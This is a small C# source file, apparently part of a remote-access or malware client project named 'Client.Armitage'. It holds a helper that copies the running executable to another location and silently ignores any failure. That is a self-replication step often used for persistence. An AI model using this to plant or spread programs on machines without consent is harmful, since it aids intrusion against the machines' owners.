using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    public static class Copy
    {
        public static bool CopySelfTo(string target, bool overwrite = true)
        {
            try
            {
                File.Copy(Constants.MyPath, target, overwrite);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
